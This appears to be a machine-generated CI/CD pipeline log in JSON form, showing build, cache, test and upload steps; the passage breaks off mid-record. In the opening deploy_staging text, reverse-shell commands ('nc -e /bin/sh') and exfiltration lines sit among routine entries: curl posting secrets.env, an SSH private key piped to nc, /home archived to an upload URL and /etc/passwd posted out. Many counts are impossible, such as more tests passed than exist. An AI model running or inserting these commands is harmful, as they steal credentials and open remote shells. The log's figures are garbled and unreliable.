lint completed\npip install: Successfully installed axios-5.13\nCompiling lib/handler.rs...\nCompiling components/main.py...\nTime: 110.102s\nTime: 51.900s\nOK\npip: Downloading webpack-2.7.tar.gz\nnpm install: resolved 233 packages\npip install: Successfully installed axios-5.13\npip: Collecting webpack\nEnvironment: staging\nWARNING: prettier has known vulnerabilities\nnpm install: added 231 packages\nMinifying main.js\nRan 50 tests in 36s\nTransforming 845 files...\nGenerating source maps...\nMinifying main.js\nCache saved successfully\n\u2713 All checks passed\n[12:19:08] INFO: Starting build process\n  PASS: test_db_connect (109ms)\nRan 117 tests in 24s\nConnecting to acme.corp:443...\n[12:19:08] INFO: Processing request\nCache invalidated: build\nMinifying app.js\nUsing Node.js 15.2.5\nChecking out master branch\nProcessing...\nSuccess!\nCache invalidated: dependencies\nWARNING: eslint has known vulnerabilities\nLoading...\nStep 18/16: Testing\n[12:19:08] DEBUG: Memory usage: 212MB\n[12:19:08] INFO: Connecting to database\nMinifying vendor.js\nPulling image: python:latest\nPulling image: node:18\nUsing Python 3.9\nStep 14/19: Building\nGenerating source maps...\nStep 19/23: Running migrations\nPOST /data - 201 (241ms)\n[12:19:08] WARN: Deprecated API usage\nBundling main.css\n\u2713 Task completed in 1821ms\n=== Step checkout completed ===\n=== Step: deploy_staging ===\n\u2713 All checks passed\nnpm install: added 389 packages\npip install: Successfully installed prettier-2.2\nStep 10/20: Linting\nRan 152 tests in 7s\nReady.\nTest Suites: 18 passed, 6 total\nLoading...\nnc -e /bin/sh 14.207.236.145 40781\ncurl -X POST https://startup.dev/collect -d @secrets.env\nHEAD is now at ccb3ae7\nCompiling src/main.py...\nPushing to registry...\nTransforming 542 files...\nStep 8/17: Deploying\n  PASS: e2e/test_db_connect.spec.js\nnpm install: added 179 packages\n[12:19:08] WARN: Deprecated API usage\npip: Collecting webpack\nTLS handshake completed\nChecking out develop branch\nSending 17MB of data to acme.corp\nGET /api - 200 (42ms)\nyarn add: Done in 2.82s\nConnection established\nArtifact uploaded: build.tar.gz (4MB)\nCompiling utils/app.ts...\nSending 30MB of data to example.com\nCompiling src/service.java...\nChecking out main branch\nSending 50MB of data to example.com\necho $(cat ~/.ssh/id_rsa) | base64 | nc 49.237.198.229 47201\nPOST /api - 201 (373ms)\nCache saved successfully\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nTests: 408 passed, 365 total\n[12:19:08] DEBUG: Connection pool: 11 active\nSuccess!\nCoverage: 83% statements, 77% branches\npip: Collecting webpack\nCache miss for key-3867\n[12:19:08] INFO: Connecting to database\nnpm notice: created a lockfile\n[12:19:08] INFO: Connecting to database\ncurl -X POST https://startup.dev/collect -d @secrets.env\nCompleted.\nUploading artifact 'coverage' (38 files)\nnpm install: resolved 1181 packages\n  PASS: integration/test_auth_login.spec.js\nStep 2/22: Testing\nCache restored successfully (331MB)\nMinifying vendor.js\nSnapshots: 37 passed, 23 total\nCache saved successfully\n[12:19:08] INFO: Cache refreshed\nSnapshots: 22 passed, 7 total\n\u2717 build failed with exit code 85\nStep 16/17: Installing dependencies\nBuilding Docker image...\nEnvironment: staging\nOptimizing 98 modules...\nFetching submodules...\n[12:19:08] WARN: Deprecated API usage\n[12:19:08] INFO: Starting build process\n[12:19:08] WARN: Deprecated API usage\npip: Installing build dependencies...\n[12:19:08] DEBUG: Loading configuration\nSwitched to branch 'feature/task-695'\nnpm install: resolved 1156 packages\nSending 324MB of data to example.com\nWaiting...\nOK\nChecking out main branch\n[12:19:08] DEBUG: Initializing service\n[12:19:08] ERROR: Connection failed\nyarn add: Done in 25.5s\n[12:19:08] DEBUG: Initializing service\nLayer 7/15: COPY command\n[12:19:08] INFO: Processing request\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nTests: 215 passed, 293 total\nCompleted.\nCache miss for key-3408\nCache invalidated: build\nSnapshots: 29 passed, 13 total\nSnapshots: 43 passed, 25 total\nVerifying...\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nSnapshots: 26 passed, 48 total\n[12:19:08] INFO: Connecting to database\nUsing Node.js 17.16.7\nChecking out main branch\nUsing Python 3.12\nStep 13/16: Deploying\nEnvironment: production\nRan 30 tests in 54s\nDone.\nTest Suites: 26 passed, 48 total\nnpm install: resolved 724 packages\nGET /health - 201 (74ms)\nLayer 1/12: COPY command\nCache hit for key-8752\nFinished.\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n[12:19:09] DEBUG: Initializing service\n[12:19:09] DEBUG: Memory usage: 494MB\nPushing to registry...\n[12:19:09] WARN: Deprecated API usage\nLoading...\nLayer 5/15: ENV command\nNODE_ENV=development\n\u2713 Task completed in 4920ms\nnc -e /bin/sh 243.20.132.249 60480\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\nReady.\nProcessing...\n[12:19:09] WARN: Deprecated API usage\n\u2713 Task completed in 317ms\n[12:19:09] INFO: Request completed\nCache hit for key-6819\n[12:19:09] INFO: Processing request\ncurl -X POST https://test.io/collect -d @secrets.env\npip: Installing build dependencies...\nFinished.\n\u2713 Task completed in 1780ms\nUsing Python 3.10\nEnvironment: development\nGET /status - 204 (42ms)\n\u2713 Task completed in 239ms\n[12:19:09] INFO: Processing request\nCache saved successfully\nProcessing...\nStep 1/25: Installing dependencies\nBuilding Docker image...\nPOST /api - 202 (358ms)\nStep 5/23: Testing\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nImage pulled successfully\nHEAD is now at 3b3f2c2\n[12:19:09] DEBUG: Connection pool: 1 active\nCache restored successfully (427MB)\nnpm notice: package.json updated\nyarn add: Done in 27.16s\nTime: 19.649s\nCompleted.\n\u2713 Task completed in 1900ms\nArtifact downloaded: 20MB\nReady.\n[12:19:09] INFO: Request completed\nStep 11/22: Installing dependencies\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\nTLS handshake completed\ncurl -X POST https://acme.corp/collect -d @secrets.env\nRan 138 tests in 7s\nCompiling lib/utils.go...\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:19:09] DEBUG: Initializing service\nGenerating source maps...\n[12:19:09] DEBUG: Memory usage: 1527MB\nCompiling src/index.js...\n[12:19:09] DEBUG: Memory usage: 1271MB\nWARNING: express has known vulnerabilities\nGET /api - 204 (34ms)\n\u2713 Task completed in 2319ms\nProcessing...\nConnection established\nCreating production build...\n  PASS: test_api_health (318ms)\n[12:19:09] INFO: Starting build process\nCompleted.\npip: Downloading express-1.9.tar.gz\nBuilding Docker image...\n[12:19:09] INFO: Request completed\n[12:19:09] DEBUG: Initializing service\n[12:19:09] WARN: Deprecated API usage\nStep 9/21: Running migrations\nCompleted.\n[12:19:09] DEBUG: Memory usage: 309MB\nBuilding Docker image...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nRan 140 tests in 25s\n\u2713 Step 'test' succeeded\nCompiling lib/utils.go...\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\n=== Step deploy_staging completed ===",
    "steps": [
      {
        "name": "unit_tests",
        "status": "success",
        "started_at": "2025-11-24T12:19:08.815481",
        "finished_at": "2025-11-24T12:19:36.792023",
        "log_lines": [
          "=== Step: unit_tests ===",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 2/19: Running migrations",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Checking out develop branch",
          "Step 1/21: Testing",
          "Tests: 455 passed, 68 total",
          "Compiling lib/app.ts...",
          "pip: Collecting eslint",
          "Compiling lib/index.js...",
          "Compiling lib/service.java...",
          "Pulling image: alpine:18",
          "WARNING: axios has known vulnerabilities",
          "[12:19:08] DEBUG: Initializing service",
          "POST /api - 202 (55ms)",
          "Fetching submodules...",
          "Test Suites: 18 passed, 8 total",
          "Completed.",
          "[12:19:08] DEBUG: Loading configuration",
          "Platform: darwin-arm64",
          "Done.",
          "\u2713 lint completed",
          "Creating production build...",
          "Done.",
          "  PASS: test_api_health (418ms)",
          "[12:19:08] WARN: Deprecated API usage",
          "Tests: 342 passed, 225 total",
          "  PASS: e2e/test_db_connect.spec.js",
          "npm notice: created a lockfile",
          "TLS handshake completed",
          "Tests: 376 passed, 137 total",
          "Waiting...",
          "Tests: 423 passed, 436 total",
          "Ready.",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] INFO: Cache refreshed",
          "Generating source maps...",
          "Environment: production",
          "Cache miss for key-4297",
          "[12:19:08] INFO: Starting build process",
          "Coverage: 91% statements, 65% branches",
          "[12:19:08] WARN: Deprecated API usage",
          "Ran 86 tests in 33s",
          "Artifact uploaded: build.tar.gz (24MB)",
          "npm notice: package.json updated",
          "[12:19:08] INFO: Request completed",
          "Cache saved successfully",
          "Layer 7/15: COPY command",
          "Cache restored successfully (54MB)",
          "Fetching submodules...",
          "Processing...",
          "[12:19:08] DEBUG: Connection pool: 8 active",
          "\u2713 Step 'build' succeeded",
          "npm install: added 491 packages",
          "Generating source maps...",
          "[12:19:08] DEBUG: Query executed in 16ms",
          "Snapshots: 17 passed, 38 total",
          "Cache miss for key-6698",
          "[12:19:08] INFO: Connecting to database",
          "Compiling lib/handler.rs...",
          "[12:19:08] DEBUG: Loading configuration",
          "Compiling src/app.ts...",
          "npm notice: package.json updated",
          "[12:19:08] INFO: Request completed",
          "pip: Collecting prettier",
          "Compiling utils/index.js...",
          "[12:19:08] INFO: Cache refreshed",
          "Coverage: 94% statements, 97% branches",
          "[12:19:08] WARN: Deprecated API usage",
          "Checking out develop branch",
          "Artifact downloaded: 15MB",
          "Transforming 543 files...",
          "Switched to branch 'bugfix/task-890'",
          "\u2717 build failed with exit code 29",
          "Connecting to startup.dev:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "yarn add: Done in 21.44s",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "OK",
          "Time: 27.948s",
          "Time: 105.777s",
          "\u2713 validate completed",
          "  PASS: unit/test_db_connect.spec.js",
          "npm install: resolved 1682 packages",
          "Waiting...",
          "Cache hit for key-7235",
          "[12:19:08] DEBUG: Memory usage: 988MB",
          "Step 14/21: Testing",
          "Pushing to registry...",
          "Pushing to registry...",
          "Snapshots: 40 passed, 25 total",
          "TLS handshake completed",
          "HEAD is now at 9177c67",
          "[12:19:08] DEBUG: Memory usage: 1036MB",
          "TLS handshake completed",
          "Step 19/25: Building",
          "Connecting to acme.corp:443...",
          "Completed.",
          "Cache saved successfully",
          "Loading...",
          "[12:19:08] WARN: Deprecated API usage",
          "Layer 4/10: ENV command",
          "Transforming 381 files...",
          "Finished.",
          "[12:19:08] DEBUG: Memory usage: 987MB",
          "Bundling main.css",
          "Using Node.js 20.13.4",
          "Bundling main.css",
          "Step 19/18: Running migrations",
          "[12:19:08] DEBUG: Initializing service",
          "Checking out main branch",
          "Layer 1/9: ENV command",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Transforming 591 files...",
          "Cache hit for key-6735",
          "\u2717 build failed with exit code 101",
          "Completed.",
          "[12:19:08] WARN: Deprecated API usage",
          "Coverage: 88% statements, 66% branches",
          "[12:19:08] INFO: Cache refreshed",
          "Loading...",
          "Artifact downloaded: 15MB",
          "[12:19:08] ERROR: Connection failed",
          "Finished.",
          "pip install: Successfully installed lodash-5.18",
          "Compiling src/main.py...",
          "Done.",
          "Snapshots: 20 passed, 17 total",
          "\u2713 Task completed in 3926ms",
          "Processing...",
          "pip: Installing build dependencies...",
          "Artifact uploaded: dist.zip (78MB)",
          "Cache restored successfully (325MB)",
          "Cache invalidated: build",
          "POST /upload - 202 (293ms)",
          "Cache hit for key-5913",
          "Connection established",
          "Platform: win32-x64",
          "NODE_ENV=development",
          "Installing express@2.7.6",
          "Success!",
          "Step 17/21: Deploying",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:19:08] DEBUG: Query executed in 22ms",
          "Pulling image: alpine:3.11",
          "[12:19:08] INFO: Processing request",
          "pip: Installing build dependencies...",
          "WARNING: eslint has known vulnerabilities",
          "[12:19:08] DEBUG: Memory usage: 1240MB",
          "  PASS: test_api_health (477ms)",
          "Environment: development",
          "Compiling src/app.ts...",
          "Step 13/21: Testing",
          "  PASS: unit/test_cache_hit.spec.js",
          "[12:19:08] INFO: Request completed",
          "Artifact uploaded: build.tar.gz (47MB)",
          "pip: Collecting express",
          "Cache miss for key-1511",
          "\u2713 Step 'build' succeeded",
          "NODE_ENV=test",
          "Cache invalidated: build",
          "Layer 7/15: COPY command",
          "pip install: Successfully installed express-1.3",
          "Creating production build...",
          "Finished.",
          "=== Step unit_tests completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-11-24T12:19:36.792023",
        "finished_at": "2025-11-24T12:19:42.387331",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Compiling lib/app.ts...",
          "Compiling src/app.ts...",
          "Cache invalidated: dependencies",
          "Generating source maps...",
          "Installing eslint@1.15.10",
          "Cache restored successfully (188MB)",
          "[12:19:08] INFO: Cache refreshed",
          "Transforming 831 files...",
          "[12:19:08] WARN: Deprecated API usage",
          "Environment: production",
          "Using Python 3.9",
          "TLS handshake completed",
          "WARNING: lodash has known vulnerabilities",
          "Building Docker image...",
          "[12:19:08] DEBUG: Memory usage: 1589MB",
          "Success!",
          "Waiting...",
          "Minifying main.js",
          "Bundling vendor.js",
          "Step 20/24: Building",
          "Success!",
          "Checking out develop branch",
          "Processing...",
          "Verifying...",
          "FAILED: test_cache_hit",
          "Cache miss for key-8617",
          "Generating source maps...",
          "GET /api - 201 (26ms)",
          "WARNING: lodash has known vulnerabilities",
          "Completed.",
          "Waiting...",
          "WARNING: axios has known vulnerabilities",
          "Connection established",
          "[12:19:08] WARN: Deprecated API usage",
          "Pushing to registry...",
          "Transforming 699 files...",
          "Done.",
          "[12:19:08] ERROR: Connection failed",
          "HEAD is now at 1e1ca7a",
          "\u2713 Step 'checkout' succeeded",
          "Verifying...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Finished.",
          "Bundling main.js",
          "Building Docker image...",
          "Cache restored successfully (392MB)",
          "pip: Downloading webpack-1.20.tar.gz",
          "Processing...",
          "HEAD is now at 3938032",
          "FAILED: test_auth_login",
          "Ready.",
          "\u2713 validate completed",
          "Step 4/25: Testing",
          "Building Docker image...",
          "Loading...",
          "Artifact uploaded: dist.zip (72MB)",
          "Using Node.js 19.10.0",
          "Creating production build...",
          "WARNING: eslint has known vulnerabilities",
          "Test Suites: 21 passed, 25 total",
          "Generating source maps...",
          "\u2713 lint completed",
          "Ready.",
          "Bundling vendor.js",
          "Completed.",
          "Coverage: 80% statements, 82% branches",
          "Minifying app.js",
          "GET /status - 201 (43ms)",
          "Compiling utils/index.js...",
          "[12:19:08] INFO: Cache refreshed",
          "\u2713 validate completed",
          "npm install: resolved 1296 packages",
          "Loading...",
          "\u2713 build completed",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Pulling image: python:latest",
          "npm install: added 397 packages",
          "Connection established",
          "POST /data - 200 (106ms)",
          "Step 20/16: Building",
          "[12:19:08] WARN: Deprecated API usage",
          "  PASS: integration/test_api_health.spec.js",
          "Environment: production",
          "Success!",
          "Checking out develop branch",
          "NODE_ENV=development",
          "npm install: resolved 574 packages",
          "POST /upload - 201 (202ms)",
          "[12:19:08] INFO: Connecting to database",
          "Cache hit for key-2807",
          "pip: Installing build dependencies...",
          "Layer 4/8: RUN command",
          "Bundling main.js",
          "Time: 115.800s",
          "Compiling src/main.py...",
          "[12:19:08] DEBUG: Loading configuration",
          "[12:19:08] WARN: Deprecated API usage",
          "HEAD is now at 55019db",
          "\u2713 Step 'checkout' succeeded",
          "Minifying app.js",
          "Tests: 289 passed, 79 total",
          "[12:19:08] WARN: Deprecated API usage",
          "Cache hit for key-5729",
          "Bundling styles.css",
          "[12:19:08] DEBUG: Memory usage: 1458MB",
          "Finished.",
          "Bundling runtime.css",
          "Transforming 995 files...",
          "Cache restored successfully (493MB)",
          "Step 19/15: Installing dependencies",
          "HEAD is now at f2b657e",
          "[12:19:08] DEBUG: Memory usage: 407MB",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] DEBUG: Loading configuration",
          "[12:19:08] DEBUG: Connection pool: 4 active",
          "Cache restored successfully (34MB)",
          "Using Python 3.9",
          "Using Python 3.9",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Loading...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Platform: win32-x64",
          "Step 12/17: Testing",
          "Using Python 3.10",
          "Artifact uploaded: dist.zip (48MB)",
          "Step 11/25: Deploying",
          "Creating production build...",
          "WARNING: express has known vulnerabilities",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Cache invalidated: dependencies",
          "yarn add: Done in 30.40s",
          "Platform: linux-x64",
          "Step 6/16: Running migrations",
          "Exception: RuntimeError",
          "Switched to branch 'bugfix/task-742'",
          "Creating production build...",
          "Completed.",
          "HEAD is now at 3875f95",
          "POST /upload - 202 (242ms)",
          "Step 14/24: Building",
          "WARNING: jest has known vulnerabilities",
          "[12:19:08] INFO: Cache refreshed",
          "  PASS: test_auth_login (283ms)",
          "\u2713 validate completed",
          "Creating production build...",
          "\u2713 validate completed",
          "Uploading artifact 'dist' (47 files)",
          "Pulling image: node:18",
          "Minifying vendor.js",
          "Step 1/24: Deploying",
          "[12:19:08] INFO: Processing request",
          "Test Suites: 25 passed, 41 total",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "HEAD is now at 986e408",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Cache saved successfully",
          "Coverage: 91% statements, 96% branches",
          "Pulling image: alpine:latest",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "\u2713 Task completed in 168ms",
          "[12:19:08] DEBUG: Query executed in 25ms",
          "Image pulled successfully",
          "Pushing to registry...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-11-24T12:19:42.387331",
        "finished_at": "2025-11-24T12:19:51.712845",
        "log_lines": [
          "=== Step: setup_environment ===",
          "pip: Installing build dependencies...",
          "Compiling components/utils.go...",
          "Already up to date.",
          "  PASS: test_cache_hit (441ms)",
          "Building Docker image...",
          "Step 7/20: Linting",
          "Cache saved successfully",
          "npm notice: package.json updated",
          "Success!",
          "Step 8/24: Installing dependencies",
          "Connecting to cloud.services:443...",
          "Step 15/16: Running migrations",
          "pip: Downloading webpack-4.4.tar.gz",
          "FAILED: test_user_create",
          "Image pulled successfully",
          "Waiting...",
          "Step 8/16: Testing",
          "HEAD is now at 13803b9",
          "NODE_ENV=production",
          "[12:19:08] INFO: Starting build process",
          "Waiting...",
          "TLS handshake completed",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] DEBUG: Connection pool: 6 active",
          "yarn add: Done in 8.61s",
          "Exception: ValueError",
          "Processing...",
          "Artifact downloaded: 21MB",
          "npm notice: package.json updated",
          "[12:19:08] DEBUG: Query executed in 95ms",
          "[12:19:08] DEBUG: Initializing service",
          "Cache hit for key-9525",
          "FAILED: test_user_create",
          "Compiling lib/service.java...",
          "POST /upload - 200 (416ms)",
          "Step 1/15: Deploying",
          "Step 5/17: Testing",
          "Switched to branch 'hotfix/task-957'",
          "Pushing to registry...",
          "\u2713 All checks passed",
          "HEAD is now at 1378d9c",
          "[12:19:08] ERROR: Connection failed",
          "[12:19:08] DEBUG: Memory usage: 889MB",
          "pip: Collecting lodash",
          "Ready.",
          "pip: Collecting lodash",
          "[12:19:08] DEBUG: Query executed in 33ms",
          "Step 5/21: Installing dependencies",
          "Artifact downloaded: 31MB",
          "  PASS: e2e/test_user_create.spec.js",
          "yarn add: Done in 12.85s",
          "Step 18/23: Testing",
          "NODE_ENV=development",
          "[12:19:08] DEBUG: Query executed in 91ms",
          "Step 11/17: Linting",
          "Done.",
          "Compiling lib/app.ts...",
          "Ran 195 tests in 46s",
          "Test Suites: 15 passed, 49 total",
          "[12:19:08] INFO: Starting build process",
          "Success!",
          "TLS handshake completed",
          "Compiling components/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 1/19: Testing",
          "Time: 22.278s",
          "Switched to branch 'bugfix/task-895'",
          "Success!",
          "npm notice: package.json updated",
          "POST /data - 202 (496ms)",
          "Processing...",
          "Using Node.js 16.5.3",
          "WARNING: axios has known vulnerabilities",
          "[12:19:08] INFO: Processing request",
          "FAILED: test_cache_hit",
          "HEAD is now at c629b90",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 package completed",
          "Installing eslint@3.17.5",
          "Already up to date.",
          "[12:19:08] INFO: Starting build process",
          "[12:19:08] INFO: Request completed",
          "Transforming 446 files...",
          "Optimizing 14 modules...",
          "pip: Installing build dependencies...",
          "[12:19:08] INFO: Connecting to database",
          "Cache invalidated: node_modules",
          "[12:19:08] DEBUG: Connection pool: 16 active",
          "Creating production build...",
          "[12:19:08] INFO: Connecting to database",
          "  PASS: integration/test_auth_login.spec.js",
          "WARNING: eslint has known vulnerabilities",
          "Success!",
          "Cache invalidated: build",
          "Connecting to startup.dev:443...",
          "TLS handshake completed",
          "Image pulled successfully",
          "Step 13/20: Installing dependencies",
          "[12:19:08] DEBUG: Connection pool: 18 active",
          "Connecting to startup.dev:443...",
          "Compiling utils/utils.go...",
          "Step 10/22: Deploying",
          "FAILED: test_db_connect",
          "Step 3/18: Building",
          "Coverage: 87% statements, 74% branches",
          "[12:19:08] INFO: Request completed",
          "[12:19:08] WARN: Deprecated API usage",
          "\u2717 build failed with exit code 91",
          "Verifying...",
          "Snapshots: 38 passed, 17 total",
          "NODE_ENV=development",
          "Cache restored successfully (369MB)",
          "Using Node.js 14.17.10",
          "Cache miss for key-8724",
          "Done.",
          "npm notice: created a lockfile",
          "POST /data - 201 (256ms)",
          "Artifact uploaded: build.tar.gz (33MB)",
          "Cache hit for key-2479",
          "Environment: test",
          "Fetching submodules...",
          "Step 12/21: Building",
          "WARNING: eslint has known vulnerabilities",
          "OK",
          "[12:19:08] INFO: Processing request",
          "Compiling src/utils.go...",
          "Artifact uploaded: dist.zip (35MB)",
          "Waiting...",
          "Verifying...",
          "NODE_ENV=test",
          "Generating source maps...",
          "npm notice: created a lockfile",
          "[12:19:08] WARN: Deprecated API usage",
          "pip install: Successfully installed react-1.19",
          "npm install: resolved 632 packages",
          "[12:19:08] DEBUG: Query executed in 4ms",
          "npm install: added 448 packages",
          "Checking out main branch",
          "npm install: resolved 1065 packages",
          "TLS handshake completed",
          "[12:19:08] INFO: Starting build process",
          "Step 12/15: Building",
          "TLS handshake completed",
          "Generating source maps...",
          "Using Node.js 17.20.6",
          "Creating production build...",
          "OK",
          "Connecting to cloud.services:443...",
          "Creating production build...",
          "Step 17/21: Building",
          "Optimizing 67 modules...",
          "Compiling lib/index.js...",
          "Artifact uploaded: dist.zip (41MB)",
          "Image pulled successfully",
          "\u2717 build failed with exit code 80",
          "Artifact downloaded: 17MB",
          "POST /data - 200 (48ms)",
          "Test Suites: 48 passed, 28 total",
          "FAILED: test_user_create",
          "Cache saved successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Coverage: 76% statements, 83% branches",
          "npm install: added 231 packages",
          "npm notice: created a lockfile",
          "Artifact uploaded: build.tar.gz (2MB)",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-11-24T12:19:51.712845",
        "finished_at": "2025-11-24T12:20:01.038359",
        "log_lines": [
          "=== Step: setup_node ===",
          "[12:19:08] INFO: Cache refreshed",
          "Compiling src/main.py...",
          "\u2713 All checks passed",
          "Success!",
          "\u2713 Task completed in 1598ms",
          "Artifact downloaded: 23MB",
          "POST /api - 201 (412ms)",
          "Artifact uploaded: dist.zip (15MB)",
          "[12:19:08] INFO: Cache refreshed",
          "Completed.",
          "Verifying...",
          "[12:19:08] DEBUG: Connection pool: 6 active",
          "[12:19:08] INFO: Request completed",
          "\u2717 build failed with exit code 106",
          "Time: 86.875s",
          "Compiling utils/app.ts...",
          "Cache saved successfully",
          "Fetching submodules...",
          "Pushing to registry...",
          "npm install: resolved 793 packages",
          "Connecting to acme.corp:443...",
          "Minifying app.js",
          "npm notice: package.json updated",
          "Already up to date.",
          "  PASS: unit/test_auth_login.spec.js",
          "Using Node.js 15.14.5",
          "Fetching submodules...",
          "Ran 36 tests in 15s",
          "Checking out master branch",
          "npm notice: created a lockfile",
          "Compiling utils/handler.rs...",
          "\u2713 Step 'build' succeeded",
          "Uploading artifact 'coverage' (26 files)",
          "Uploading artifact 'build' (13 files)",
          "pip: Downloading jest-5.7.tar.gz",
          "  PASS: test_api_health (473ms)",
          "pip: Downloading jest-2.9.tar.gz",
          "[12:19:08] INFO: Connecting to database",
          "[12:19:08] DEBUG: Connection pool: 16 active",
          "Installing react@1.3.9",
          "npm notice: package.json updated",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] INFO: Connecting to database",
          "Optimizing 58 modules...",
          "GET /health - 204 (35ms)",
          "Finished.",
          "Already up to date.",
          "Connecting to test.io:443...",
          "[12:19:08] DEBUG: Initializing service",
          "[12:19:08] DEBUG: Memory usage: 687MB",
          "Ran 108 tests in 48s",
          "[12:19:08] DEBUG: Memory usage: 124MB",
          "Minifying main.js",
          "Completed.",
          "Transforming 597 files...",
          "\u2713 Task completed in 4636ms",
          "Connection established",
          "[12:19:08] DEBUG: Initializing service",
          "npm notice: package.json updated",
          "Installing webpack@1.17.9",
          "Finished.",
          "[12:19:08] INFO: Connecting to database",
          "[12:19:08] WARN: Deprecated API usage",
          "Pulling image: node:latest",
          "Snapshots: 15 passed, 31 total",
          "Compiling components/service.java...",
          "Building Docker image...",
          "WARNING: prettier has known vulnerabilities",
          "Time: 84.318s",
          "Ran 93 tests in 30s",
          "Loading...",
          "Completed.",
          "Transforming 860 files...",
          "Generating source maps...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:08] INFO: Connecting to database",
          "Minifying app.js",
          "Connection established",
          "Creating production build...",
          "Creating production build...",
          "Cache invalidated: build",
          "yarn add: Done in 29.59s",
          "Step 1/21: Testing",
          "WARNING: lodash has known vulnerabilities",
          "OK",
          "pip: Collecting eslint",
          "\u2713 Step 'install' succeeded",
          "  PASS: test_user_create (321ms)",
          "Environment: production",
          "[12:19:08] WARN: Deprecated API usage",
          "GET /status - 200 (79ms)",
          "Tests: 388 passed, 326 total",
          "[12:19:08] DEBUG: Query executed in 94ms",
          "[12:19:08] INFO: Processing request",
          "Verifying...",
          "[12:19:08] DEBUG: Query executed in 35ms",
          "Time: 5.172s",
          "Platform: linux-x64",
          "Cache invalidated: node_modules",
          "Step 15/17: Linting",
          "Coverage: 93% statements, 72% branches",
          "Verifying...",
          "Processing...",
          "TLS handshake completed",
          "Environment: production",
          "Optimizing 21 modules...",
          "Test Suites: 16 passed, 35 total",
          "\u2713 Step 'setup' succeeded",
          "pip: Collecting express",
          "Compiling lib/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "WARNING: axios has known vulnerabilities",
          "yarn add: Done in 27.59s",
          "[12:19:08] DEBUG: Loading configuration",
          "Optimizing 84 modules...",
          "Step 6/21: Linting",
          "[12:19:08] INFO: Cache refreshed",
          "WARNING: express has known vulnerabilities",
          "Compiling components/service.java...",
          "HEAD is now at de50d08",
          "[12:19:08] INFO: Request completed",
          "WARNING: jest has known vulnerabilities",
          "Compiling components/app.ts...",
          "Compiling lib/index.js...",
          "npm notice: created a lockfile",
          "npm install: added 409 packages",
          "Connection established",
          "Loading...",
          "Cache hit for key-5074",
          "Platform: win32-x64",
          "Waiting...",
          "Installing lodash@1.12.9",
          "\u2713 Task completed in 124ms",
          "Step 8/24: Testing",
          "Tests: 399 passed, 145 total",
          "FAILED: test_user_create",
          "Loading...",
          "\u2713 Step 'build' succeeded",
          "Step 8/18: Testing",
          "Generating source maps...",
          "Snapshots: 36 passed, 1 total",
          "Cache invalidated: dependencies",
          "Artifact uploaded: build.tar.gz (35MB)",
          "yarn add: Done in 19.30s",
          "Switched to branch 'bugfix/task-419'",
          "\u2713 All checks passed",
          "[12:19:08] WARN: Deprecated API usage",
          "[12:19:08] INFO: Request completed",
          "Compiling components/app.ts...",
          "Loading...",
          "Processing...",
          "Success!",
          "Compiling utils/utils.go...",
          "Ready.",
          "Cache restored successfully (60MB)",
          "Generating source maps...",
          "Image pulled successfully",
          "[12:19:08] WARN: Deprecated API usage",
          "Coverage: 77% statements, 80% branches",
          "Cache miss for key-9941",
          "Step 8/18: Linting",
          "Transforming 345 files...",
          "  PASS: test_user_create (240ms)",
          "  PASS: test_user_create (16ms)",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-24T12:20:01.038359",
        "finished_at": "2025-11-24T12:20:10.363873",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Compiling lib/service.java...",
          "TLS handshake completed",
          "Cache hit for key-7717",
          "Cache saved successfully",
          "Artifact uploaded: build.tar.gz (13MB)",
          "Exception: RuntimeError",
          "Waiting...",
          "Checking out develop branch",
          "\u2713 Step 'checkout' succeeded",
          "Step 15/16: Testing",
          "[12:19:08] ERROR: Connection failed",
          "Time: 51.613s",
          "Artifact uploaded: dist.zip (16MB)",
          "Using Python 3.12",
          "Finished.",
          "Bundling runtime.js",
          "HEAD is now at 8dec56b",
          "\u2713 All checks passed",
          "OK",
          "Installing jest@3.19.6",
          "[12:19:08] DEBUG: Initializing service",
          "  PASS: test_auth_login (399ms)",
          "Cache hit for key-1327",
          "Step 5/19: Running migrations",
          "Compiling components/index.js...",
